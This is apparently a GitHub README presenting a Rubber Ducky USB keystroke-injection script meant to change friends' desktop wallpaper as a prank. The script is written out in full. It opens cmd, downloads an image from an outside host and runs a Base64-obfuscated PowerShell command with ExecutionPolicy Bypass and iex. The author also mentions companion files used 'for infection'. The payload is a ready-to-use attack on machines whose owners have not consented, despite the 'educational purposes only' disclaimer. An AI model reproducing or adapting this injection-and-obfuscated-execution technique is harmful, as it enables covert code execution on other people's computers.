# Rubber Ducky Wallpaper Changer

I got a new Rubber Ducky USB and I am right now testing it to prank my friends ;).
The only important files in this repository are:
- **changer script.bat**
- "the image folder"

Other Files in this repo:
- runexe.mp4
- wallpaperblock.bat
are not important.
I only need them for infection (another ducky script)

Here is the script:

```
DELAY 1000
GUI r
DELAY 100
STRINGLN cmd
DELAY 2000
STRINGLN start /min cmd /c "curl -o %userprofile%/image333.jpeg https://i.imgur.com/gVsgyro.jpeg && Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASQB5ADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMABqAEQAUQBvAGoASQBGAE4AagBjAG0AbAB3AGQARQA1AGgAYgBXAFUAZwBPAGkAQgBUAFoAWABSAFgAWQBXAHgAcwBMAG4AQgB6AE0AUwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMATQBOAEMAaQBNAGcAUgBHAFYAegBZADMASgBwAGMASABSAHAAYgAyADQAZwBPAGkAQgBHAGIAMwBKAGoAWgBTAEIAaABJAEUAUgBsAGMAMgB0ADAAYgAzAEEAZwBkADIARgBzAGIASABCAGgAYwBHAFYAeQBJAEYASgBsAFoAbgBKAGwAYwAyAGcAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAHcAMABLAEkAeQBCAEQAYwBtAFYAawBhAFgAUgB6AEkAQwBBADYASQBGAFYAdQBhADIANQB2AGQAMgA0AGcASwBHAGwAbQBJAEgAbAB2AGQAUwBCAHIAYgBtADkAMwBJAEcAOQB5AGEAVwBkAHAAYgBtAEYAcwBJAEcATgB5AFoAVwBGADAAYgAzAEkAcwBJAEcAeABsAGQAQwBCADEAYwB5AEIAcgBiAG0AOQAzAEsAUwBBAGcASQBDAEEAagBEAFEAbwBqAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAE0ATgBDAGkATQBnAFIARwBGADAAWgBTAEEANgBJAEQAQQB4AEkARQBwADEAYgBIAGsAZwBNAGoAQQB5AE0AQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQB3ADAASwBJAHkAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAHQATABTADAAdABMAFMAMAB0AEwAUwAwAGoARABRAG8ATgBDAGkATgBOAGIAMgBSAHAAWgBuAGsAZwBVAEcARgAwAGEAQwBCADAAYgB5AEIAMABhAEcAVQBnAGMARwBsAGoAZABIAFYAeQBaAFMAQgBoAFkAMgBOAHYAYwBtAFIAcABiAG0AZABzAGUAUwBCADAAYgB5AEIAeQBaAFcAWgBzAFoAVwBOADAASQBIAGwAdgBkAFgASQBnAGEAVwA1AG0AYwBtAEYAegBkAEgASgAxAFkAMwBSADEAYwBtAFUATgBDAGkAUgBwAGIAVwBkAFEAWQBYAFIAbwBQAFMASQBsAGQAWABOAGwAYwBuAEIAeQBiADIAWgBwAGIARwBVAGwATAAyAGwAdABZAFcAZABsAE0AegBNAHoATABtAHAAdwBaAFcAYwBpAEQAUQBvAGsAWQAyADkAawBaAFMAQQA5AEkARQBBAG4ASQBBADAASwBkAFgATgBwAGIAbQBjAGcAVQAzAGwAegBkAEcAVgB0AEwAbABKADEAYgBuAFIAcABiAFcAVQB1AFMAVwA1ADAAWgBYAEoAdgBjAEYATgBsAGMAbgBaAHAAWQAyAFYAegBPAHkAQQBOAEMAbQA1AGgAYgBXAFYAegBjAEcARgBqAFoAUwBCAFgAYQBXADQAegBNAG4AcwBnAEQAUQBvAGcASQBDAEEAZwBEAFEAbwBnAEkAQwBBAGcASQBIAEIAMQBZAG0AeABwAFkAeQBCAGoAYgBHAEYAegBjAHkAQgBYAFkAVwB4AHMAYwBHAEYAdwBaAFgASgA3AEkAQQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCAGIAUgBHAHgAcwBTAFcAMQB3AGIAMwBKADAASwBDAEoAMQBjADIAVgB5AE0AegBJAHUAWgBHAHgAcwBJAGkAdwBnAFEAMgBoAGgAYwBsAE4AbABkAEQAMQBEAGEARwBGAHkAVQAyAFYAMABMAGsARgAxAGQARwA4AHAAWABTAEEATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEgATgAwAFkAWABSAHAAWQB5AEIAbABlAEgAUgBsAGMAbQA0AGcAYQBXADUAMABJAEYATgA1AGMAMwBSAGwAYgBWAEIAaABjAG0ARgB0AFoAWABSAGwAYwBuAE4ASgBiAG0AWgB2AEkAQwBoAHAAYgBuAFEAZwBkAFUARgBqAGQARwBsAHYAYgBpAEEAcwBJAEcAbAB1AGQAQwBCADEAVQBHAEYAeQBZAFcAMABnAEwAQwBCAHoAZABIAEoAcABiAG0AYwBnAGIASABCADIAVQBHAEYAeQBZAFcAMABnAEwAQwBCAHAAYgBuAFEAZwBaAG4AVgBYAGEAVwA1AEoAYgBtAGsAcABJAEQAcwBnAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBIAEIAMQBZAG0AeABwAFkAeQBCAHoAZABHAEYAMABhAFcATQBnAGQAbQA5AHAAWgBDAEIAVABaAFgAUgBYAFkAVwB4AHMAYwBHAEYAdwBaAFgASQBvAGMAMwBSAHkAYQBXADUAbgBJAEgAUgBvAFoAVgBCAGgAZABHAGcAcABlAHkAQQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBGAE4ANQBjADMAUgBsAGIAVgBCAGgAYwBtAEYAdABaAFgAUgBsAGMAbgBOAEoAYgBtAFoAdgBLAEQASQB3AEwARABBAHMAZABHAGgAbABVAEcARgAwAGEAQwB3AHoASwBUAHMAZwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQgA5AEQAUQBvAGcASQBDAEEAZwBmAFEAMABLAEkASAAwAGcARABRAG8AbgBRAEEAMABLAEQAUQBwAGgAWgBHAFEAdABkAEgAbAB3AFoAUwBBAGsAWQAyADkAawBaAFMAQQBOAEMAZwAwAEsASQAwAEYAdwBjAEcAeAA1AEkASABSAG8AWgBTAEIARABhAEcARgB1AFoAMgBVAGcAYgAyADQAZwBkAEcAaABsAEkASABOADUAYwAzAFIAbABiAFMAQQBOAEMAbAB0AFgAYQBXADQAegBNAGkANQBYAFkAVwB4AHMAYwBHAEYAdwBaAFgASgBkAE8AagBwAFQAWgBYAFIAWABZAFcAeABzAGMARwBGAHcAWgBYAEkAbwBKAEcAbAB0AFoAMQBCAGgAZABHAGcAcABEAFEAbwA9ACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA="
DELAY 100
STRINGLN exit
```

you need to encode the script for it to work... for encoding use https://payloadstudio.hak5.org/community/

and don´t forget to use the "german" keyboard layout if you are using this on german computers...

- EVERYTHING IS FOR EDUCATIONAL PURPOSES ONLY! I AM NOT RESPONSIBLE FOR ANY DAMAGES!
